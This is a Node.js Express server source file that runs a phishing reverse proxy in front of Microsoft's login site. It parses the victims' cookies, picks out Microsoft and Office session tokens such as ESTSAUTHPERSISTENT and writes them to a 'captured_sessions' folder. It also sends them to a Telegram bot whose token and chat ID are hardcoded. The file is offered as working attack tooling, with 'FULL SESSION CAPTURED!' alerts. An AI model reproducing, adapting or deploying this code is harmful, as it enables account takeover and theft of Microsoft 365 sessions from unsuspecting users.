const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const fs = require('fs-extra');
const path = require('path');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

const CONFIG = {
  botToken: '8730465777:AAHmQqHT-aPYbAtxItqtDSAtoeGhcXIv-4g',
  chatId: '7075480337'
};

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const STORAGE_DIR = './captured_sessions';
fs.ensureDirSync(STORAGE_DIR);

async function sendToTelegram(message, fileData = null) {
  try {
    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CONFIG.chatId, text: message, parse_mode: 'HTML' })
    });
    if (fileData) {
      const FormData = require('form-data');
      const form = new FormData();
      form.append('chat_id', CONFIG.chatId);
      form.append('document', JSON.stringify(fileData, null, 2), `session_${Date.now()}.json`);
      await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`, { method: 'POST', body: form });
    }
  } catch (e) { console.error('Telegram error:', e.message); }
}

function extractCookies(headers) {
  const cookies = {};
  const cookieHeader = headers.cookie || headers.Cookie || '';
  if (cookieHeader) {
    cookieHeader.split(';').forEach(part => {
      const [name, ...rest] = part.trim().split('=');
      if (name) cookies[name] = rest.join('=');
    });
  }
  return cookies;
}

function extractOfficeCookies(cookies) {
  const office = {};
  const targets = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ESTSAUTHLIGHT', 'SignInState', 'SignInPolicy', 'LoginOptions', 'MSTeams', 'MSA', 'AAD', 'Microsoft', 'Office', 'Outlook', 'SharePoint'];
  for (const [name, value] of Object.entries(cookies)) {
    if (targets.some(t => name.includes(t))) office[name] = value;
  }
  return office;
}

// ✅ THE PROXY ROUTE – DEFINITELY HERE
const proxy = createProxyMiddleware({
  target: 'https://login.microsoftonline.com',
  changeOrigin: true,
  secure: true,
  cookieDomainRewrite: { '*': '' },
  onProxyReq: (proxyReq, req) => {
    const cookieHeader = proxyReq.getHeader('cookie') || req.headers.cookie || '';
    if (cookieHeader) {
      const cookies = extractCookies({ cookie: cookieHeader });
      const office = extractOfficeCookies(cookies);
      const hasSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
      const data = { timestamp: new Date().toISOString(), cookies, office, hasSession };
      fs.writeJsonSync(path.join(STORAGE_DIR, `proxy_${Date.now()}.json`), data, { spaces: 2 });
      if (Object.keys(office).length || hasSession) {
        let msg = '🎯 <b>PROXY CAPTURE</b>\n';
        msg += `🍪 Total: ${Object.keys(cookies).length}\n`;
        msg += `🎯 Office: ${Object.keys(office).length}\n`;
        if (hasSession) msg += '\n🔥 FULL SESSION CAPTURED!';
        sendToTelegram(msg, data);
      }
    }
  }
});

app.use('/proxy', proxy);

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/injector.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'injector.html'));
});

app.listen(PORT, () => {
  console.log(`✅ Proxy running on port ${PORT}`);
});
